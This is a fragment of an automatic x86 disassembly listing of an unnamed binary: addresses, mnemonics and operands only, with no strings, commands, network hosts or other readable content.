  40266e:	add    esi,DWORD PTR [ebx+0x65]
  402671:	add    BYTE PTR [eax],al
  402673:	or     bh,BYTE PTR [ebp+0xa]
  402676:	add    BYTE PTR [eax],al
  402678:	add    al,0x2
  40267a:	add    al,0x7d
  40267c:	or     eax,DWORD PTR [eax]
  40267e:	add    BYTE PTR [edx+ebp*1],al
  402681:	add    BYTE PTR [eax],al
  402683:	add    BYTE PTR [ebx],dl
  402685:	xor    BYTE PTR [edx],al
  402687:	add    BYTE PTR [edx+0x0],dl
  40268a:	add    BYTE PTR [eax],al
  40268c:	or     BYTE PTR [eax],al
  40268e:	add    BYTE PTR [ecx],dl
  402690:	add    ebp,DWORD PTR [edi+0x66]
  402693:	add    BYTE PTR [eax],al
  402695:	or     ch,BYTE PTR [edi+0x67]
  402698:	add    BYTE PTR [eax],al
  40269a:	or     ch,BYTE PTR [edx+eax*1]
  40269d:	push   ss
  40269e:	sub    al,BYTE PTR [ebx]
  4026a0:	outs   dx,DWORD PTR ds:[esi]
  4026a1:	data16 add BYTE PTR [eax],al
  4026a4:	or     ch,BYTE PTR [edi+0x68]
  4026a7:	add    BYTE PTR [eax],al
  4026a9:	or     ch,BYTE PTR [edi+0x69]
  4026ac:	add    BYTE PTR [eax],al
  4026ae:	or     al,BYTE PTR [edx]
  4026b0:	jnp    0x4026bc
  4026b2:	add    BYTE PTR [eax],al
  4026b4:	add    al,0x28
  4026b6:	push   0x0
  4026b8:	add    BYTE PTR [edx],cl
  4026ba:	sub    al,0x2
  4026bc:	push   ss
  4026bd:	sub    al,BYTE PTR [ebx]
  4026bf:	outs   dx,DWORD PTR ds:[esi]
  4026c0:	imul   eax,DWORD PTR [eax],0x0
  4026c3:	or     ch,BYTE PTR [eax]
  4026c5:	ins    BYTE PTR es:[edi],dx
  4026c6:	add    BYTE PTR [eax],al
  4026c8:	or     cl,BYTE PTR [edx]
  4026ca:	push   es
  4026cb:	add    bh,BYTE PTR [ebx+0xb]
  4026ce:	add    BYTE PTR [eax],al
  4026d0:	add    al,0x28
  4026d2:	ins    DWORD PTR es:[edi],dx
  4026d3:	add    BYTE PTR [eax],al
  4026d5:	or     ch,BYTE PTR [edx+eax*1]
  4026d8:	push   ss
  4026d9:	sub    al,BYTE PTR [edx]
  4026db:	add    ebp,DWORD PTR [eax]
  4026dd:	outs   dx,BYTE PTR ds:[esi]
  4026de:	add    BYTE PTR [eax],al
  4026e0:	or     ch,BYTE PTR [edx]
  4026e2:	cmp    al,BYTE PTR [edx]
  4026e4:	sub    BYTE PTR [edi+0x0],ch
  4026e7:	add    BYTE PTR [edx],cl
  4026e9:	add    al,BYTE PTR [ebx]
  4026eb:	jge    0x4026f9
  4026ed:	add    BYTE PTR [eax],al
  4026ef:	add    al,0x2a
  4026f1:	rol    BYTE PTR [edx],cl
  4026f3:	jnp    0x402701
  4026f5:	add    BYTE PTR [eax],al
  4026f7:	add    al,0x3
  4026f9:	outs   dx,DWORD PTR ds:[esi]
  4026fa:	jo     0x4026fc
  4026fc:	add    BYTE PTR [edx],cl
  4026fe:	add    ebp,DWORD PTR [edi+0x71]
  402701:	add    BYTE PTR [eax],al
  402703:	or     al,BYTE PTR [ebx]
  402705:	outs   dx,DWORD PTR ds:[esi]
  402706:	jb     0x402708
  402708:	add    BYTE PTR [edx],cl
  40270a:	add    ebp,DWORD PTR [edi+0x73]
  40270d:	add    BYTE PTR [eax],al
  40270f:	or     al,BYTE PTR [ebx]
  402711:	outs   dx,DWORD PTR ds:[esi]
  402712:	je     0x402714
  402714:	add    BYTE PTR [edx],cl
  402716:	push   ss
  402717:	inc    BYTE PTR [ecx]
  402719:	add    ebp,DWORD PTR [edi+0x75]
  40271c:	add    BYTE PTR [eax],al
  40271e:	or     bl,BYTE PTR [eax]
  402720:	outs   dx,DWORD PTR ds:[esi]
  402721:	xchg   edi,eax
  402722:	add    BYTE PTR [eax],al
  402724:	push   es
  402725:	sub    bl,BYTE PTR [edx+0xc7b02]
  40272b:	add    BYTE PTR [ebx+eax*1],al
  40272e:	outs   dx,DWORD PTR ds:[esi]
  40272f:	jbe    0x402731
  402731:	add    BYTE PTR [edx],cl
  402733:	add    ebp,DWORD PTR [edi+0x77]
  402736:	add    BYTE PTR [eax],al
  402738:	or     dl,BYTE PTR ds:0x2a472
  40273e:	jo     0x402757
  402740:	add    ebp,DWORD PTR [edi+0x78]
  402743:	add    BYTE PTR [eax],al
  402745:	or     dl,BYTE PTR [edi]
  402747:	outs   dx,DWORD PTR ds:[esi]
  402748:	xchg   edi,eax
  402749:	add    BYTE PTR [eax],al
  40274b:	push   es
  40274c:	sub    dh,BYTE PTR [esi]
  40274e:	add    bh,BYTE PTR [ebx+0xc]
  402751:	add    BYTE PTR [eax],al
  402753:	add    al,0x3
  402755:	outs   dx,DWORD PTR ds:[esi]
  402756:	cwde   
  402757:	add    BYTE PTR [eax],al
  402759:	push   es
  40275a:	sub    bl,BYTE PTR [edx+0xc7b02]
  402760:	add    BYTE PTR [ebx+eax*1],al
  402763:	outs   dx,DWORD PTR ds:[esi]
  402764:	jbe    0x402766
  402766:	add    BYTE PTR [edx],cl
  402768:	add    ebp,DWORD PTR [edi+0x77]
  40276b:	add    BYTE PTR [eax],al
  40276d:	or     dl,BYTE PTR ds:0x2a472
  402773:	jo     0x40278c
  402775:	add    ebp,DWORD PTR [edi+0x78]
  402778:	add    BYTE PTR [eax],al
  40277a:	or     bl,BYTE PTR [ebx]
  40277c:	outs   dx,DWORD PTR ds:[esi]
  40277d:	xchg   edi,eax
  40277e:	add    BYTE PTR [eax],al
  402780:	push   es
  402781:	sub    bl,BYTE PTR [edx+0xc7b02]
  402787:	add    BYTE PTR [ebx+eax*1],al
  40278a:	outs   dx,DWORD PTR ds:[esi]
  40278b:	jns    0x40278d
  40278d:	add    BYTE PTR [edx],cl
  40278f:	add    ebp,DWORD PTR [edi+0x7a]
  402792:	add    BYTE PTR [eax],al
  402794:	or     dl,BYTE PTR ds:0x2a472
  40279a:	jo     0x4027b3
  40279c:	add    ebp,DWORD PTR [edi+0x7b]
  40279f:	add    BYTE PTR [eax],al
  4027a1:	or     bl,BYTE PTR [ecx]
  4027a3:	outs   dx,DWORD PTR ds:[esi]
  4027a4:	xchg   edi,eax
  4027a5:	add    BYTE PTR [eax],al
  4027a7:	push   es
  4027a8:	sub    bl,BYTE PTR [esi+0x2]
  4027ab:	jnp    0x4027b9
  4027ad:	add    BYTE PTR [eax],al
  4027af:	add    al,0x3
  4027b1:	adc    eax,0x2a47215
  4027b6:	add    BYTE PTR [eax+0x17],dh
  4027b9:	add    al,0x1a
  4027bb:	outs   dx,DWORD PTR ds:[esi]
  4027bc:	xchg   edi,eax
  4027bd:	add    BYTE PTR [eax],al
  4027bf:	push   es
  4027c0:	sub    ah,dh
  4027c2:	add    bh,BYTE PTR [esi+0x7c]
  4027c5:	add    BYTE PTR [eax],al
  4027c7:	or     bh,BYTE PTR [ebp+0x11]
  4027ca:	add    BYTE PTR [eax],al
  4027cc:	add    al,0x2
  4027ce:	jle    0x40284c
  4027d0:	add    BYTE PTR [eax],al
  4027d2:	or     bh,BYTE PTR [ebp+0x12]
  4027d5:	add    BYTE PTR [eax],al
  4027d7:	add    al,0x2
  4027d9:	jle    0x402857
  4027db:	add    BYTE PTR [eax],al
  4027dd:	or     bh,BYTE PTR [ebp+0x13]
  4027e0:	add    BYTE PTR [eax],al
  4027e2:	add    al,0x2
  4027e4:	jle    0x402862
  4027e6:	add    BYTE PTR [eax],al
  4027e8:	or     bh,BYTE PTR [ebp+0x14]
  4027eb:	add    BYTE PTR [eax],al
  4027ed:	add    al,0x2
  4027ef:	sub    BYTE PTR [eax+0x0],bl
  4027f2:	add    BYTE PTR [edx],cl
  4027f4:	add    ch,BYTE PTR [eax]
  4027f6:	and    eax,0x2a060000
  4027fb:	add    BYTE PTR [ebx],bl
  4027fd:	xor    BYTE PTR [ebx],al
  4027ff:	add    BYTE PTR [edi+0x9000000],al
  402805:	add    BYTE PTR [eax],al
  402807:	adc    DWORD PTR [ebx+0x7d],esi
  40280a:	add    BYTE PTR [eax],al
  40280c:	or     cl,BYTE PTR [edx]
  40280e:	adc    al,0xb
  402810:	add    ebp,DWORD PTR [eax]
  402812:	jle    0x402814
  402814:	add    BYTE PTR [edx],cl
  402816:	or     eax,DWORD PTR [edi]
  402818:	sub    al,0x73
  40281a:	pop    es
  40281b:	outs   dx,DWORD PTR ds:[esi]
  40281c:	jg     0x40281e
  40281e:	add    BYTE PTR [edx],cl
  402820:	push   ss
  402821:	xor    DWORD PTR [edx+0x2],ebp
  402824:	pop    es
  402825:	sub    BYTE PTR [eax+eax*1],ah
  402828:	add    BYTE PTR [esi],al
  40282a:	sub    al,0xa
  40282c:	add    al,BYTE PTR [edi]
  40282e:	sub    BYTE PTR [esi],ah
  402830:	add    BYTE PTR [eax],al
  402832:	push   es
  402833:	or     ch,BYTE PTR [ebx]
  402835:	push   edi
  402836:	sub    BYTE PTR [ecx],ah
  402838:	add    BYTE PTR [eax],al
  40283a:	or     dh,BYTE PTR [ebx-0x80]
  40283d:	add    BYTE PTR [eax],al
  40283f:	or     cl,BYTE PTR [edi+eax*1]
  402842:	outs   dx,DWORD PTR ds:[esi]
  402843:	add    DWORD PTR [eax],0x5130a00
  402849:	sub    ebp,DWORD PTR [ecx]
  40284b:	adc    DWORD PTR ds:0x826f,eax
  402851:	or     cl,BYTE PTR ds:0x28080902
  402857:	daa    
  402858:	add    BYTE PTR [eax],al
  40285a:	push   es
  40285b:	adc    eax,DWORD PTR [ecx+edx*1]
  40285e:	add    al,0x6f
  402860:	jg     0x402862
  402862:	add    BYTE PTR [edx],cl
  402864:	push   ss
  402865:	xor    DWORD PTR ds:0x57506,ecx
  40286b:	add    BYTE PTR [ebx],bl
  40286d:	adc    DWORD PTR [edi+ebp*2],eax
  402870:	add    DWORD PTR [eax],0x0
  402873:	or     dl,BYTE PTR [ecx]
  402875:	add    eax,0x846f
  40287a:	or     ch,BYTE PTR ds:0x110cdece
  402880:	add    eax,0x511072c
  402885:	outs   dx,DWORD PTR ds:[esi]
  402886:	inc    ebx
  402887:	add    BYTE PTR [eax],al
  402889:	or     bl,ah
  40288b:	adc    al,0xc
  40288d:	push   es
  40288e:	sub    al,BYTE PTR [eax]
  402890:	add    DWORD PTR [eax],edx
  402892:	add    BYTE PTR [eax],al
  402894:	add    al,BYTE PTR [eax]
  402896:	inc    ecx
  402897:	add    BYTE PTR [esi],dh
  402899:	ja     0x40289b
  40289b:	or     al,0x0
  40289d:	add    BYTE PTR [eax],al
  40289f:	add    BYTE PTR [ebx],dl
  4028a1:	xor    BYTE PTR [ebx],al
  4028a3:	add    BYTE PTR [esi+0x0],dh
  4028a6:	add    BYTE PTR [eax],al
  4028a8:	or     al,BYTE PTR [eax]
  4028aa:	add    BYTE PTR [ecx],dl
  4028ac:	push   ss
  4028ad:	or     dl,BYTE PTR [esi]
  4028af:	or     ebp,DWORD PTR [ebx]
  4028b1:	add    eax,DWORD PTR gs:[edi]
  4028b4:	outs   dx,DWORD PTR ds:[esi]
  4028b5:	test   DWORD PTR [eax],eax
  4028b7:	add    BYTE PTR [edx],cl
  4028b9:	or     al,0x8
  4028bb:	jb     0x402863
  4028bd:	add    al,BYTE PTR [eax]
  4028bf:	jo     0x402930
  4028c1:	xchg   BYTE PTR [eax],al
  4028c3:	add    BYTE PTR [edx],cl
  4028c5:	sub    eax,0xa672080c
  4028ca:	add    al,BYTE PTR [eax]
  4028cc:	jo     0x4028f6
  4028ce:	and    eax,DWORD PTR [eax]
  4028d0:	add    BYTE PTR [edx],cl
  4028d2:	or     al,0x8
  4028d4:	add    bh,BYTE PTR [ebx+0x11]
  4028d7:	add    BYTE PTR [eax],al
  4028d9:	add    al,0x1b
  4028db:	sub    BYTE PTR [edi+0x2c0a0000],al
  4028e1:	sub    eax,0x127b0208
  4028e6:	add    BYTE PTR [eax],al
  4028e8:	add    al,0x1b
  4028ea:	sub    BYTE PTR [edi+0x2c0a0000],al
  4028f0:	push   ds
  4028f1:	or     BYTE PTR [edx],al
  4028f3:	jnp    0x402908
  4028f5:	add    BYTE PTR [eax],al
  4028f7:	add    al,0x1b
  4028f9:	sub    BYTE PTR [edi+0x2c0a0000],al
  4028ff:	invd   
  402901:	add    bh,BYTE PTR [ebx+0x14]
  402904:	add    BYTE PTR [eax],al
  402906:	add    al,0x1b
  402908:	sub    BYTE PTR [edi+0x2d0a0000],al
  40290e:	add    al,0x17
  402910:	or     ch,BYTE PTR [ebx]
  402912:	or     eax,0xb581707
  402917:	pop    es
  402918:	add    ebp,DWORD PTR [edi+0x7f]
  40291b:	add    BYTE PTR [eax],al
  40291d:	or     dh,BYTE PTR [edx]
  40291f:	xchg   edx,eax
  402920:	push   es
  402921:	sub    al,BYTE PTR [eax]
  402923:	add    BYTE PTR [ebx],al
  402925:	xor    BYTE PTR [ebx],al
  402927:	add    BYTE PTR [ecx+eax*1],ah
  40292a:	add    BYTE PTR [eax],al
  40292c:	add    BYTE PTR [eax],al
  40292e:	add    BYTE PTR [eax],al
  402930:	add    bl,BYTE PTR [edx]
  402932:	sub    BYTE PTR [eax+0x7d0a0000],cl
  402938:	adc    DWORD PTR [eax],eax
  40293a:	add    BYTE PTR [edx+eax*1],al
  40293d:	jnp    0x402950
  40293f:	add    BYTE PTR [eax],al
  402941:	add    al,0x2d
  402943:	or     eax,0x7c7e02
  402948:	add    BYTE PTR [edx],cl
  40294a:	jge    0x40295d
  40294c:	add    BYTE PTR [eax],al
  40294e:	add    al,0x2b
  402950:	sub    BYTE PTR [edx],al
  402952:	jnp    0x402965
  402954:	add    BYTE PTR [eax],al
  402956:	add    al,0x72
  402958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402959:	add    al,BYTE PTR [eax]
  40295b:	jo     0x4029cc
  40295d:	xchg   BYTE PTR [eax],al
  40295f:	add    BYTE PTR [edx],cl
  402961:	sub    eax,0x7b250216
  402966:	adc    DWORD PTR [eax],eax
  402968:	add    BYTE PTR [edx+esi*2],al
  40296b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40296c:	add    al,BYTE PTR [eax]
  40296e:	jo     0x402998
  402970:	and    eax,DWORD PTR [eax]
  402972:	add    BYTE PTR [edx],cl
  402974:	jge    0x402987
  402976:	add    BYTE PTR [eax],al
  402978:	add    al,0x2
  40297a:	sbb    DWORD PTR [eax],ebp
  40297c:	mov    BYTE PTR [eax],al
  40297e:	add    BYTE PTR [edx],cl
  402980:	jge    0x402994
  402982:	add    BYTE PTR [eax],al
  402984:	add    al,0x2
  402986:	jnp    0x40299a
  402988:	add    BYTE PTR [eax],al
  40298a:	add    al,0x2d
  40298c:	or     eax,0x7c7e02
  402991:	add    BYTE PTR [edx],cl
  402993:	jge    0x4029a7
  402995:	add    BYTE PTR [eax],al
  402997:	add    al,0x2b
  402999:	sub    BYTE PTR [edx],al
  40299b:	jnp    0x4029af
  40299d:	add    BYTE PTR [eax],al
  40299f:	add    al,0x72
  4029a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029a2:	add    al,BYTE PTR [eax]
  4029a4:	jo     0x402a15
  4029a6:	xchg   BYTE PTR [eax],al
  4029a8:	add    BYTE PTR [edx],cl
  4029aa:	sub    eax,0x7b250216
  4029af:	adc    al,BYTE PTR [eax]
  4029b1:	add    BYTE PTR [edx+esi*2],al
  4029b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029b5:	add    al,BYTE PTR [eax]
  4029b7:	jo     0x4029e1
  4029b9:	and    eax,DWORD PTR [eax]
  4029bb:	add    BYTE PTR [edx],cl
  4029bd:	jge    0x4029d1
  4029bf:	add    BYTE PTR [eax],al
  4029c1:	add    al,0x2
  4029c3:	sbb    BYTE PTR [eax],ch
  4029c5:	mov    BYTE PTR [eax],al
  4029c7:	add    BYTE PTR [edx],cl
  4029c9:	jge    0x4029de
  4029cb:	add    BYTE PTR [eax],al
  4029cd:	add    al,0x2
  4029cf:	jnp    0x4029e4
  4029d1:	add    BYTE PTR [eax],al
  4029d3:	add    al,0x2d
  4029d5:	or     eax,0x7c7e02
  4029da:	add    BYTE PTR [edx],cl
  4029dc:	jge    0x4029f1
  4029de:	add    BYTE PTR [eax],al
  4029e0:	add    al,0x2b
  4029e2:	sub    BYTE PTR [edx],al
  4029e4:	jnp    0x4029f9
  4029e6:	add    BYTE PTR [eax],al
  4029e8:	add    al,0x72
  4029ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029eb:	add    al,BYTE PTR [eax]
  4029ed:	jo     0x402a5e
  4029ef:	xchg   BYTE PTR [eax],al
  4029f1:	add    BYTE PTR [edx],cl
  4029f3:	sub    eax,0x7b250216
  4029f8:	adc    eax,DWORD PTR [eax]
  4029fa:	add    BYTE PTR [edx+esi*2],al
  4029fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029fe:	add    al,BYTE PTR [eax]
  402a00:	jo     0x402a2a
  402a02:	and    eax,DWORD PTR [eax]
  402a04:	add    BYTE PTR [edx],cl
  402a06:	jge    0x402a1b
  402a08:	add    BYTE PTR [eax],al
  402a0a:	add    al,0x2
  402a0c:	pop    ss
  402a0d:	sub    BYTE PTR [eax+0x7d0a0000],cl
  402a13:	adc    al,0x0
  402a15:	add    BYTE PTR [edx+eax*1],al
  402a18:	jnp    0x402a2e
  402a1a:	add    BYTE PTR [eax],al
  402a1c:	add    al,0x2d
  402a1e:	or     al,0x2
  402a20:	jle    0x402a9e
  402a22:	add    BYTE PTR [eax],al
  402a24:	or     bh,BYTE PTR [ebp+0x14]
  402a27:	add    BYTE PTR [eax],al
  402a29:	add    al,0x2a
  402a2b:	add    bh,BYTE PTR [ebx+0x14]
  402a2e:	add    BYTE PTR [eax],al
  402a30:	add    al,0x72
  402a32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a33:	add    al,BYTE PTR [eax]
  402a35:	jo     0x402aa6
  402a37:	xchg   BYTE PTR [eax],al
  402a39:	add    BYTE PTR [edx],cl
  402a3b:	sub    eax,0x7b250216
  402a40:	adc    al,0x0
  402a42:	add    BYTE PTR [edx+esi*2],al
  402a45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a46:	add    al,BYTE PTR [eax]
  402a48:	jo     0x402a72
  402a4a:	and    eax,DWORD PTR [eax]
  402a4c:	add    BYTE PTR [edx],cl
  402a4e:	jge    0x402a64
  402a50:	add    BYTE PTR [eax],al
  402a52:	add    al,0x2a
  402a54:	sbb    esi,DWORD PTR [eax]
  402a56:	add    al,0x0
  402a58:	mov    esp,0xb000000
  402a5d:	add    BYTE PTR [eax],al
  402a5f:	adc    DWORD PTR [ebx+0x7d],esi
  402a62:	add    BYTE PTR [eax],al
  402a64:	or     cl,BYTE PTR [edx]
  402a66:	sub    BYTE PTR [ecx],ah
  402a68:	add    BYTE PTR [eax],al
  402a6a:	or     dh,BYTE PTR [ebx-0x80]
  402a6d:	add    BYTE PTR [eax],al
  402a6f:	or     cl,BYTE PTR [ebx]
  402a71:	add    ebp,DWORD PTR [edi-0x7f]
  402a74:	add    BYTE PTR [eax],al
  402a76:	or     dl,BYTE PTR [ebx]
  402a78:	add    al,0x38
  402a7a:	add    BYTE PTR [eax],0x0
  402a7d:	add    BYTE PTR [ecx],dl
  402a7f:	add    al,0x6f
  402a81:	add    BYTE PTR [eax],0x0
  402a84:	or     cl,BYTE PTR [ebx+esi*2]
  402a87:	jge    0x402a89
  402a89:	add    BYTE PTR [edx],cl
  402a8b:	or     eax,0x117b0208
  402a90:	add    BYTE PTR [eax],al
  402a92:	add    al,0x1b
  402a94:	sub    BYTE PTR [edi+0x2d0a0000],al
  402a9a:	or     al,0x2
  402a9c:	or     BYTE PTR [edi],dl
  402a9e:	pop    es
  402a9f:	sub    BYTE PTR [eax],ch
  402aa1:	add    BYTE PTR [eax],al
  402aa3:	push   es
  402aa4:	or     eax,0x208422b
  402aa9:	jnp    0x402abd
  402aab:	add    BYTE PTR [eax],al
  402aad:	add    al,0x1b
  402aaf:	sub    BYTE PTR [edi+0x2c0a0000],al
  402ab5:	dec    eax
  402ab6:	or     BYTE PTR [edx],al
  402ab8:	jnp    0x402acd
  402aba:	add    BYTE PTR [eax],al
  402abc:	add    al,0x1b
  402abe:	sub    BYTE PTR [edi+0x2c0a0000],al
  402ac4:	cmp    DWORD PTR [eax],ecx
  402ac6:	add    bh,BYTE PTR [ebx+0x14]
  402ac9:	add    BYTE PTR [eax],al
  402acb:	add    al,0x1b
  402acd:	sub    BYTE PTR [edi+0x2d0a0000],al
  402ad3:	or     al,0x2
  402ad5:	or     BYTE PTR [edi],dl
  402ad7:	pop    es
  402ad8:	sub    BYTE PTR [eax],ch
  402ada:	add    BYTE PTR [eax],al
  402adc:	push   es
  402add:	or     eax,0x802092b
  402ae2:	pop    es
  402ae3:	sub    BYTE PTR [edi],ah
  402ae5:	add    BYTE PTR [eax],al
  402ae7:	push   es
  402ae8:	or     eax,0x7f6f09
  402aed:	add    BYTE PTR [edx],cl
  402aef:	push   ss
  402af0:	xor    DWORD PTR [esi+eax*1],ecx
  402af3:	jne    0x402afa
  402af5:	add    BYTE PTR [eax],al
  402af7:	sbb    ecx,DWORD PTR [ecx]
  402af9:	outs   dx,DWORD PTR ds:[esi]
  402afa:	add    DWORD PTR [eax],0x0
  402afd:	or     dl,BYTE PTR [ecx]
  402aff:	add    al,0x6f
  402b01:	test   BYTE PTR [eax],al
  402b03:	add    BYTE PTR [edx],cl
  402b05:	cmp    dh,BYTE PTR [edi+edi*8-0x1]
  402b09:	(bad)  
  402b0a:	fimul  WORD PTR [ecx+edx*1]
  402b0d:	add    al,0x2c
  402b0f:	pop    es
  402b10:	adc    DWORD PTR [edi+ebp*2],eax
  402b13:	inc    ebx
  402b14:	add    BYTE PTR [eax],al
  402b16:	or     bl,ah
  402b18:	adc    al,0xb
  402b1a:	push   es
  402b1b:	sub    al,BYTE PTR [ecx]
  402b1d:	adc    BYTE PTR [eax],al
  402b1f:	add    BYTE PTR [edx],al
  402b21:	add    BYTE PTR [ecx],bl
  402b23:	add    BYTE PTR [ebx+0xc00ac],dl
  402b29:	add    BYTE PTR [eax],al
  402b2b:	add    BYTE PTR [ebx],dl
  402b2d:	xor    BYTE PTR [ebx],al
  402b2f:	add    BYTE PTR [eax+eax*1+0x0],ch
  402b33:	add    BYTE PTR [eax+eax*1],cl
  402b36:	add    BYTE PTR [ecx],dl
  402b38:	jae    0x402bb7
  402b3a:	add    BYTE PTR [eax],al
  402b3c:	or     cl,BYTE PTR [edx]
  402b3e:	add    esi,DWORD PTR [ebx-0x77]
  402b41:	add    BYTE PTR [eax],al
  402b43:	or     cl,BYTE PTR [ebx]
  402b45:	pop    es
  402b46:	jb     0x402af2
  402b48:	add    al,BYTE PTR [eax]
  402b4a:	jo     0x402bbb
  402b4c:	mov    al,BYTE PTR [eax]
  402b4e:	add    BYTE PTR [edx],cl
  402b50:	or     eax,0x2b041316
  402b55:	inc    ebp
  402b56:	or     DWORD PTR [ecx],edx
  402b58:	add    al,0x9a
  402b5a:	or     al,0x8
  402b5c:	outs   dx,DWORD PTR ds:[esi]
  402b5d:	mov    eax,DWORD PTR [eax]
  402b5f:	add    BYTE PTR [edx],cl
  402b61:	jb     0x402b19
  402b63:	add    al,BYTE PTR [eax]
  402b65:	jo     0x402b82
  402b67:	sub    BYTE PTR [edi+0x2d0a0000],al
  402b6d:	daa    
  402b6e:	add    al,0x8
  402b70:	outs   dx,DWORD PTR ds:[esi]
  402b71:	mov    WORD PTR [eax],es
  402b73:	add    BYTE PTR [edx],cl
  402b75:	outs   dx,DWORD PTR ds:[esi]
  402b76:	lea    eax,[eax]
  402b78:	add    BYTE PTR [edx],cl
  402b7a:	sub    eax,0x6f080619
  402b7f:	mov    es,WORD PTR [eax]
  402b81:	add    BYTE PTR [edx],cl
  402b83:	outs   dx,DWORD PTR ds:[esi]
  402b84:	pop    DWORD PTR [eax]
  402b86:	add    BYTE PTR [edx],cl
  402b88:	add    al,0x8
  402b8a:	outs   dx,DWORD PTR ds:[esi]
  402b8b:	mov    WORD PTR [eax],es
  402b8d:	add    BYTE PTR [edx],cl
  402b8f:	pop    ss
  402b90:	outs   dx,DWORD PTR ds:[esi]
  402b91:	nop
  402b92:	add    BYTE PTR [eax],al
  402b94:	or     dl,BYTE PTR [ecx]
  402b96:	add    al,0x17
  402b98:	pop    eax
  402b99:	adc    eax,DWORD PTR [ecx+edx*1]
  402b9c:	add    al,0x9
  402b9e:	mov    gs,WORD PTR [ecx+0x32]
  402ba1:	mov    ah,0x6
  402ba3:	sub    bl,BYTE PTR [ebx]
  402ba5:	xor    BYTE PTR [eax+eax*1],al
  402ba8:	mov    edx,0xd000000
  402bad:	add    BYTE PTR [eax],al
  402baf:	adc    DWORD PTR [ebx+0x7d],esi
  402bb2:	add    BYTE PTR [eax],al
  402bb4:	or     cl,BYTE PTR [edx]
  402bb6:	add    ebp,DWORD PTR [eax]
  402bb8:	sub    DWORD PTR [eax],eax
  402bba:	add    BYTE PTR [esi],al
  402bbc:	or     eax,DWORD PTR [edi]
  402bbe:	sub    BYTE PTR [ecx+0x390a0000],dl
  402bc4:	mov    al,ds:0x17000000
  402bc9:	lea    ecx,[esi]
  402bcb:	add    BYTE PTR [eax],al
  402bcd:	add    cl,BYTE PTR [eax+ecx*1]
  402bd0:	push   ss
  402bd1:	pop    es
  402bd2:	add    esi,DWORD PTR [ebx+0x67]
  402bd5:	add    BYTE PTR [eax],al
  402bd7:	push   es
  402bd8:	mov    ds:0x5c2808,al
  402bdd:	add    BYTE PTR [esi],al
  402bdf:	or     eax,0x526f09
  402be4:	add    BYTE PTR [esi],al
  402be6:	outs   dx,DWORD PTR ds:[esi]
  402be7:	xchg   edx,eax
  402be8:	add    BYTE PTR [eax],al
  402bea:	or     dl,BYTE PTR [ebx]
  402bec:	or     BYTE PTR [ebx],ch
  402bee:	pop    ecx
  402bef:	adc    DWORD PTR [eax],ecx
  402bf1:	outs   dx,DWORD PTR ds:[esi]
  402bf2:	xchg   ebx,eax
  402bf3:	add    BYTE PTR [eax],al
  402bf5:	or     dh,BYTE PTR [edi+ecx*1+0x0]
  402bf9:	add    BYTE PTR [edx],al
  402bfb:	adc    eax,DWORD PTR [ecx+edx*1]
  402bfe:	add    al,0x6f
  402c00:	jno    0x402c02
  402c02:	add    BYTE PTR [esi],al
  402c04:	jb     0x402bbc
  402c06:	add    al,BYTE PTR [eax]
  402c08:	jo     0x402c32
  402c0a:	and    eax,DWORD PTR [eax]
  402c0c:	add    BYTE PTR [edx],cl
  402c0e:	adc    eax,DWORD PTR ds:0x6f051105
  402c14:	lea    eax,[eax]
  402c16:	add    BYTE PTR [edx],cl
  402c18:	sub    eax,0x511032e
  402c1d:	sub    BYTE PTR [eax+eax*1+0x6130a00],dl
  402c24:	pop    ss
  402c25:	adc    eax,DWORD PTR [edi]
  402c27:	add    al,0x2c
  402c29:	or     DWORD PTR [ecx],edx
  402c2b:	push   es
  402c2c:	sub    BYTE PTR [ecx+0x130a0000],dl
  402c32:	pop    es
  402c33:	adc    DWORD PTR [edi],eax
  402c35:	sub    al,0x11
  402c37:	push   es
  402c38:	adc    DWORD PTR [esi],eax
  402c3a:	outs   dx,DWORD PTR ds:[esi]
  402c3b:	pop    DWORD PTR [eax]
  402c3d:	add    BYTE PTR [edx],cl
  402c3f:	add    eax,0x6f170511
  402c44:	nop
  402c45:	add    BYTE PTR [eax],al
  402c47:	or     dl,BYTE PTR [ecx]
  402c49:	or     BYTE PTR [edi-0x7c],ch
  402c4c:	add    BYTE PTR [eax],al
  402c4e:	or     ch,BYTE PTR ds:0x1115de9e
  402c54:	or     BYTE PTR [ebp+0x12],dh
  402c57:	add    BYTE PTR [eax],al
  402c59:	add    DWORD PTR [ebx],edx
  402c5b:	or     DWORD PTR [ecx],edx
  402c5d:	or     DWORD PTR [edi+eax*1],ebp
  402c60:	adc    DWORD PTR [ecx],ecx
  402c62:	outs   dx,DWORD PTR ds:[esi]
  402c63:	inc    ebx
  402c64:	add    BYTE PTR [eax],al
  402c66:	or     bl,ah
  402c68:	push   es
  402c69:	sub    al,BYTE PTR [eax]
  402c6b:	add    BYTE PTR [ecx],al
  402c6d:	adc    BYTE PTR [eax],al
  402c6f:	add    BYTE PTR [edx],al
  402c71:	add    BYTE PTR ds:0xa36600,bh
  402c77:	adc    eax,0x0
  402c7c:	adc    esi,DWORD PTR [eax]
  402c7e:	add    al,BYTE PTR [eax]
  402c80:	sbb    al,BYTE PTR [eax]
  402c82:	add    BYTE PTR [eax],al
  402c84:	push   cs
  402c85:	add    BYTE PTR [eax],al
  402c87:	adc    DWORD PTR [edx],eax
  402c89:	jb     0x402c4b
  402c8b:	add    al,BYTE PTR [eax]
  402c8d:	jo     0x402cb7
  402c8f:	xchg   esp,eax
  402c90:	add    BYTE PTR [eax],al
  402c92:	or     cl,BYTE PTR [edx]
  402c94:	push   es
  402c95:	jb     0x402c6d
  402c97:	add    al,BYTE PTR [eax]
  402c99:	jo     0x402cc3
  402c9b:	xchg   esp,eax
  402c9c:	add    BYTE PTR [eax],al
  402c9e:	or     cl,BYTE PTR [edx]
  402ca0:	push   es
  402ca1:	sub    bl,BYTE PTR [esi]
  402ca3:	add    ebp,DWORD PTR [edi-0x6b]
  402ca6:	add    BYTE PTR [eax],al
  402ca8:	or     ch,BYTE PTR [edx]
  402caa:	push   ds
  402cab:	add    ch,BYTE PTR [eax]
  402cad:	xchg   esi,eax
  402cae:	add    BYTE PTR [eax],al
  402cb0:	or     ch,BYTE PTR [edx]
  402cb2:	push   ds
